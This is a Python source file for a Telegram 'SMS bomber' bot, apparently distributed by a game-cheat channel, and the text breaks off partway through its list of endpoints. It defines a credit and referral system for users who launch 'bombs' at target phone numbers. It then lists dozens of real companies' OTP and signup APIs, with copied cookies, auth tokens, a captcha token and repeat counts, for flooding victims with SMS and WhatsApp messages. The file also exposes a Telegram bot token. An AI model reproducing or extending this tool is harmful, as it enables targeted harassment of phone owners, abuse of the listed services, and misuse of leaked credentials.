import os
import json
import time
import asyncio
import aiohttp
import logging
import random
from datetime import datetime
from typing import Dict, List, Optional
from telebot import TeleBot, types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
from collections import defaultdict
import sqlite3
import re

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8919184870:AAG-4HDkTLXH2PV8jCtGVijU-MrNWvDK6-w"
ADMIN_IDS = [8477195695]  # Replace with your Telegram user ID
CHANNEL_ID = "@BGMI_MAIN"  # Your channel username
OWNER_USERNAME = "@BGMI_CHEATS_SETUP"  # Your Telegram username

# Database setup
DB_NAME = "bomber_bot.db"

# ==================== DATABASE FUNCTIONS ====================
def init_db():
    """Initialize the database"""
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        
        # Users table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                credits INTEGER DEFAULT 2,
                referred_by INTEGER,
                join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_approved BOOLEAN DEFAULT 0,
                total_bombs INTEGER DEFAULT 0,
                last_bomb_time TIMESTAMP
            )
        ''')
        
        # Bombs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS bombs (
                bomb_id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                target_number TEXT,
                start_time TIMESTAMP,
                end_time TIMESTAMP,
                sms_sent INTEGER DEFAULT 0,
                calls_made INTEGER DEFAULT 0,
                whatsapp_sent INTEGER DEFAULT 0,
                is_active BOOLEAN DEFAULT 1,
                FOREIGN KEY (user_id) REFERENCES users (user_id)
            )
        ''')
        
        # Referrals table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS referrals (
                referrer_id INTEGER,
                referred_id INTEGER,
                credit_claimed BOOLEAN DEFAULT 0,
                referral_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (referrer_id, referred_id),
                FOREIGN KEY (referrer_id) REFERENCES users (user_id),
                FOREIGN KEY (referred_id) REFERENCES users (user_id)
            )
        ''')
        
        # Admin notifications table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS admin_notifications (
                notification_id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                target_number TEXT,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notified INTEGER DEFAULT 0
            )
        ''')
        
        conn.commit()

def get_user(user_id: int):
    """Get user data"""
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        return cursor.fetchone()

def create_user(user_id: int, username: str, first_name: str, last_name: str = "", referred_by: int = None):
    """Create new user"""
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR IGNORE INTO users (user_id, username, first_name, last_name, referred_by, credits)
            VALUES (?, ?, ?, ?, ?, 2)
        ''', (user_id, username, first_name, last_name, referred_by))
        conn.commit()

def update_user_credits(user_id: int, credits_change: int):
    """Update user credits"""
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE users 
            SET credits = credits + ? 
            WHERE user_id = ?
        ''', (credits_change, user_id))
        conn.commit()

def approve_user(user_id: int):
    """Approve user after joining channel"""
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('UPDATE users SET is_approved = 1 WHERE user_id = ?', (user_id,))
        conn.commit()

def add_bomb_record(user_id: int, target_number: str):
    """Add bomb record"""
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO bombs (user_id, target_number, start_time)
            VALUES (?, ?, CURRENT_TIMESTAMP)
        ''', (user_id, target_number))
        
        # Update user's last bomb time and total bombs
        cursor.execute('''
            UPDATE users 
            SET total_bombs = total_bombs + 1,
                last_bomb_time = CURRENT_TIMESTAMP
            WHERE user_id = ?
        ''', (user_id,))
        
        conn.commit()
        return cursor.lastrowid

def update_bomb_stats(bomb_id: int, sms: int = 0, calls: int = 0, whatsapp: int = 0):
    """Update bomb statistics"""
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE bombs 
            SET sms_sent = sms_sent + ?,
                calls_made = calls_made + ?,
                whatsapp_sent = whatsapp_sent + ?
            WHERE bomb_id = ?
        ''', (sms, calls, whatsapp, bomb_id))
        conn.commit()

def end_bomb(bomb_id: int):
    """End bomb session"""
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE bombs 
            SET end_time = CURRENT_TIMESTAMP,
                is_active = 0
            WHERE bomb_id = ?
        ''', (bomb_id,))
        conn.commit()

def add_referral(referrer_id: int, referred_id: int):
    """Add referral record"""
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR IGNORE INTO referrals (referrer_id, referred_id)
            VALUES (?, ?)
        ''', (referrer_id, referred_id))
        conn.commit()

def claim_referral_credit(referrer_id: int, referred_id: int):
    """Claim referral credit"""
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE referrals 
            SET credit_claimed = 1 
            WHERE referrer_id = ? AND referred_id = ?
        ''', (referrer_id, referred_id))
        
        # Give credit to referrer
        cursor.execute('''
            UPDATE users 
            SET credits = credits + 1 
            WHERE user_id = ?
        ''', (referrer_id,))
        conn.commit()

def add_admin_notification(user_id: int, target_number: str):
    """Add admin notification for bombing"""
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO admin_notifications (user_id, target_number)
            VALUES (?, ?)
        ''', (user_id, target_number))
        conn.commit()

def get_pending_admin_notifications():
    """Get pending admin notifications"""
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            SELECT * FROM admin_notifications 
            WHERE notified = 0 
            ORDER BY start_time DESC
        ''')
        return cursor.fetchall()

def mark_notification_sent(notification_id: int):
    """Mark notification as sent"""
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE admin_notifications 
            SET notified = 1 
            WHERE notification_id = ?
        ''', (notification_id,))
        conn.commit()

def get_all_users():
    """Get all users"""
    with sqlite3.connect(DB_NAME) as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT user_id, username, first_name, credits FROM users ORDER BY join_date DESC')
        return cursor.fetchall()

# ==================== ALL APIS ====================
# =============== ORIGINAL 100+ APIs ===============
APIS = [
    # ============ ORIGINAL API ============
    {
        "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 100,
        "category": "sms"
    },
    # ============ NEW APIS ============
    {
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"mobile_number": phone, "client_id": "kisan-app"}),
        "count": 10,
        "category": "sms"
    },
    
    {
        "url": "https://api.breeze.in/session/start",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-device-id": "A1pKVEDhlv66KLtoYsml3",
            "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
        },
        "data": lambda phone: json.dumps({
            "phoneNumber": phone,
            "authVerificationType": "otp",
            "device": {
                "id": "A1pKVEDhlv66KLtoYsml3",
                "platform": "Chrome",
                "type": "Desktop"
            },
            "countryCode": "+91"
        }),
        "count": 10,
        "category": "sms"
    },
    
    {
        "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "origin": "https://www.jockey.in",
            "referer": "https://www.jockey.in/",
            "cookie": "localization=IN; _shopify_y=6556c530-8773-4176-99cf-f587f9f00905; _tracking_consent=3.AMPS_INUP_f_f_4MXMfRPtTkGLORLJPTGqOQ; _ga=GA1.1.377231092.1757430108; _fbp=fb.1.1757430108545.190427387735094641; _quinn-sessionid=a2465823-ceb3-4519-9f8d-2a25035dfccd; cart=hWN2mTp3BwfmsVi0WqKuawTs?key=bae7dea0fc1b412ac5fceacb96232a06; wishlist_id=7531056362789hypmaaup; wishlist_customer_id=0; _shopify_s=d4985de8-eb08-47a0-9f41-84adb52e6298"
        },
        "data": None,
        "count": 10,
        "category": "sms"
    },
    
    # ============ COUNT=5 (3).txt APIs ============
    {
        "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.pw.live",
            "priority": "u=1, i",
            "referer": "https://www.pw.live/",
            "randomid": "e66d7f5b-7963-408e-9892-839015a9c83f"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "subOrgId": "SUB-PWLI000"}),
        "count": 5,
        "category": "sms"
    },
    
    {
        "url": "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN&country=india",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Length": "0",
            "Origin": "https://www.zoho.com",
            "Referer": "https://www.zoho.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 500,
        "category": "sms"
    },
    
    {
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3",
        "method": "POST",
        "headers": {
            "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587",
            "x-app-version": "3.0.3",
            "x-user-journey-id": "7e4e8701-18c6-4ed7-b7f5-eb0a2ba2fbec",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/5.0.0-alpha.11"
        },
        "data": lambda phone: json.dumps({"phone_number": {"country_code": "+91", "number": phone}}),
        "count": 20,
        "category": "sms"
    },
    
    {
        "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "shell#lang=en",
            "Origin": "https://udyogplus.adityabirlacapital.com",
            "Referer": "https://udyogplus.adityabirlacapital.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"MobileNumber={phone}&functionality=signup",
        "count": 1,
        "category": "sms"
    },
    
    {
        "url": "https://www.muthootfinance.com/smsapi.php",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "_gcl_au=1.1.289346829.1728838221; _ga=GA1.2.273797446.1728838222;",
            "origin": "https://www.muthootfinance.com",
            "referer": "https://www.muthootfinance.com/personal-loan",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"mobile={phone}&pin=XjtYYEdhP0haXjo3",
        "count": 3,
        "category": "sms"
    },
    
    {
        "url": "https://api.gopaysense.com/users/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "cookie": "_ga=GA1.2.1154421870.1728838134;",
            "origin": "https://www.gopaysense.com",
            "referer": "https://www.gopaysense.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 5,
        "category": "sms"
    },
    
    {
        "url": "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1&_wrapper_format=drupal_ajax",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "gclid=undefined; AKA_A2=A",
            "origin": "https://www.iifl.com",
            "referer": "https://www.iifl.com/personal-loans",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1",
        "count": 5,
        "category": "sms"
    },
    
    {
        "url": "https://v2-api.bankopen.co/users/register/otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://app.opencapital.co.in",
            "referer": "https://app.opencapital.co.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"username": phone, "is_open_capital": 1}),
        "count": 5,
        "category": "sms"
    },
    
    {
        "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.tatacapital.com",
            "referer": "https://www.tatacapital.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({
            "header": {
                "authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==",
                "identifier": "nli"
            },
            "body": {
                "mobileNumber": phone
            }
        }),
        "count": 40,
        "category": "sms"
    },
    
    {
        "url": "https://apis.tradeindia.com/app_login_api/login_app",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "client_remote_address": "10.0.2.16",
            "content-type": "application/json",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/4.11.0"
        },
        "data": lambda phone: json.dumps({"mobile": f"+91{phone}"}),
        "count": 3,
        "category": "sms"
    },
    
    {
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {
            "x-kb-app-name": "khatabook",
            "x-kb-app-version": "801800",
            "x-kb-app-locale": "en",
            "x-kb-platform": "android",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.10.0"
        },
        "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "app_signature": "wk+avHrHZf2"}),
        "count": 20,
        "category": "sms"
    },
    
    {
        "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.orangehealth.in",
            "referer": "https://www.orangehealth.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_number": phone, "customer_auto_fetch_message": True}),
        "count": 3,
        "category": "sms"
    },
    
    {
        "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "device-id": "e97edd71-16a3-4835-8aab-c67cf5e21be1",
            "origin": "https://www.jobhai.com",
            "referer": "https://www.jobhai.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 5,
        "category": "sms"
    },
    
    {
        "url": "https://mconnect.isteer.co/mconnect/login",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://mvaahna.com",
            "referer": "https://mvaahna.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_number": f"+91{phone}"}),
        "count": 50,
        "category": "sms"
    },
    
    {
        "url": "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank&_=1719472121119",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "referer": "https://www.astrosage.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 3,
        "category": "sms"
    },
    
    {
        "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.spinny.com",
            "referer": "https://www.spinny.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"contact_number": phone, "whatsapp": False, "code_len": 4, "g-recaptcha-response": "03AFcWeA4vFfvSahNObwINE1dnN-C8rahsbSbuh4fqeqcBJ82qWMuwus56lEKOYaUxj8u0opIAA7co7oDhBaTuIHM-Do3wgKmbo68rCKnvtFpPHiKiEpmKQhPcjvAT_6_y-2iyj_DR80S5npM-jXnNMoFS92SJQYvjGBbWFD9lFiFEgbnAWMBxUwNVyacx1gVszD7HvqC_nLDISnnqi7iWBjoYDJgTUg5iqds1DA-KYxbtEDtcpKgBi6Em34U4GG1ggZoKijC-k8qy1lInhWqo-xK6EY6acXydcGHKgXzWrsdHG2aciibuozN-3ZAWNfN0GsFfU4L1os4pe4ruCW1rEAuDJ3HT5ojiD5iiUUg4OBcJkUHCu2LSTBrTacO8PHH4PT5ruV-rvZyNVvAuX5xDcJea1NBUYyMitVtK0Lf1M75e3k3XL6K1MTq3QDDPXJlrStTSrB6qZ-m3n9Tf6sCnDZ0jcRoMtHU414MzHym3Itswbj5YuJM8wcn5aAnvvBv7UGskct4Jz4ZyJdcC5cS8AzYNSmyAS3JawN644RVl59KaNGsuYt9Ls7o2UtWhkIwlIsIBukVZW35yTaGNUhEWaRrDD-3BfUwKtloJItM2En2_nuI3f71HfTVI-I0dY6kTrMRuYfCGaz67jZiekSSIuOxenxVxp1BcG6rEO-zx-fRM_gMyDuiKGTmq98l-lPIfhSUFRXtloNr_qcKp1m6_jpzrfIi8M6UhiCYcnQCmNv19MAA8BWnEiyPPI_-FGh12jp22OCGA0mcoqGNadE6w-IezHN8fi6aWBAPRgEYf42XPv5oWiVa0ykvHg0MZKChb7n3Avk_ADibr632go3SVIIfXrFUgbWsUDLocd1WBkpeaUyKlKSqisbjKqHpxFMMaJGcjapUDstT1EMFINhNUCgowcKTY5zGMm9W9R9N48Ouxgyin2c7_0LmS5wPj3onP9yOJ8E6GL3aMKhtcxn4lXfxymyB1VFMzMMD-sAfkVoMliWhsludZWTOhuSXUE75SYxfDjrOQTlu6oRrda8QbMpR7Hv2qK2NjnrlNx4Qq2wSR0w56-Qtlif5gfFrD0U_TI7OH-yVcj45v_p0jGdoJ2Zh_6oFip5fSnSgdzXhSoGAKEVbm6NGrIGYiWLj6o-fnZrzpfRvqaS9NedG3qjr0p94lVFSeiW0s0BK0KpDWlwY4C7nbeqLkjk55tabY9B_nZjN7IXmJKNv46tZqMJVZJW37z7xV9aBQ17VARz8_UgluqS97i-NwsLuwWMZpCNpJeYGRVIKFSJtN1l3LutO1USLkYU9Or9fPEPPSOpG0fDbaFnK2QVruku8XnhvEYGHHEM0mFGcJK1-Eds95wA1c3P0Hr6DLfW7k3JKjQx_hJm719-w-UwsOYqZccz1Sh00-dmGlSJsrgOljgPOD8ZVca4Xso92P-W3NxnNEZLO45IjzTIkB1ItKYEDG7V1b4ixqw36J_lkPt7ekLvFMhcvNZkyIWTpI42Ag7ALnn6P3SfWAZwkrGXry6LPikOJz1zB5FdzEtUuF9_EO-YjzBRr1pv9ZmbSbdT2MOJv3rQ40GREvbIIfd_BA_zSyPl7HSe8QMlBksjHapVfBE_jNtcakDVSWdE6CBZjPksgIUIv6yzC0LWZA1h6v4mX-K85hmIb01UnPtnTMD_7o4K79JzYgk4gFLBxjTZVyKvBhFpVhCcq7ePBWiO8LPDbaF6R7uSF8ZgrRunZbrEMrnLBqx6EKrdtJGgN2q8VFCDjNeQJH3CuYuOISzE_rPfc", "expected_action": "login"}),
        "count": 3,
        "category": "sms"
    },
    
    {
        "url": "https://www.dream11.com/auth/passwordless/init",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "device": "pwa",
            "origin": "https://www.dream11.com",
            "referer": "https://www.dream11.com/register",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"channel": "sms", "flow": "SIGNUP", "phoneNumber": phone, "templateName": "default"}),
        "count": 1,
        "category": "sms"
    },
    
    {
        "url": "https://citymall.live/api/cl-user/auth/get-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Content-Type": "application/json",
            "Origin": "https://citymall.live",
            "Referer": "https://citymall.live/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone}),
        "count": 5,
        "category": "sms"
    },
    
    {
        "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}&storeUrl=bellavita1.myshopify.com&email=undefined&resendingOtp=false",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://bellavitaorganic.com",
            "referer": "https://bellavitaorganic.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 10,
        "category": "sms"
    },
    
    {
        "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "text/plain;charset=UTF-8",
            "origin": "https://www.oyorooms.com",
            "referer": "https://www.oyorooms.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "nod": 4}),
        "count": 2,
        "category": "sms"
    },
    
    {
        "url": "https://portal.myma.in/custom-api/auth/generateotp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://app.myma.in",
            "referer": "https://app.myma.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"countrycode": "+91", "mobile": f"91{phone}", "is_otpgenerated": False, "app_version": "-1"}),
        "count": 6,
        "category": "sms"
    },
    
    {
        "url": "https://api.freedo.rentals/customer/sendOtpForSignUp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://freedo.rentals",
            "referer": "https://freedo.rentals/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"email_id": "cokiwav528@avastu.com", "first_name": "Haiii", "mobile_number": phone}),
        "count": 6,
        "category": "sms"
    },
    
    {
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.licious.in",
            "referer": "https://www.licious.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone, "captcha_token": None}),
        "count": 3,
        "category": "sms"
    },
    
    {
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://superprofile.bio",
            "referer": "https://superprofile.bio/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phoneNumber": phone, "countryCode": "+91", "data": {"email": "abcd2@gmail.com"}, "authScreen": "signup-screen", "userIsConvertingToCreator": False}),
        "count": 1,
        "category": "sms"
    },
    
    {
        "url": "https://apis.bisleri.com/send-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.bisleri.com",
            "referer": "https://www.bisleri.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"email": "abfhhfhcd@gmail.com", "mobile": phone}),
        "count": 20,
        "category": "sms"
    },
    
    {
        "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Referer": "https://pharmacy.evitalrx.in/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"pharmacy_name": "hfhfjfgfhkf", "mobile": phone, "referral_code": "", "email_id": "jhvd@gmail.com", "zip_code": "110086", "device_id": "f2cea99f-381d-432d-bd27-02bc6678fa93", "app_version": "desktop"}),
        "count": 3,
        "category": "sms"
    },
    
    {
        "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new",
        "method": "POST",
        "headers": {
            "APP-TOKEN": "s16-q9fz-jy3p-rk",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://pwa.getquickride.com",
            "Referer": "https://pwa.getquickride.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f"contactNo={phone}&countryCode=%2B91&appName=Quick%20Ride",
        "count": 5,
        "category": "sms"
    },
    
    {
        "url": "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true&email=&is_otp=True&token",
        "method": "GET",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "referer": "https://www.clovia.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 5,
        "category": "sms"
    },
    
    {
        "url": "https://admin.kwikfixauto.in/api/auth/signupotp/",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://kwikfixauto.in",
            "referer": "https://kwikfixauto.in/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
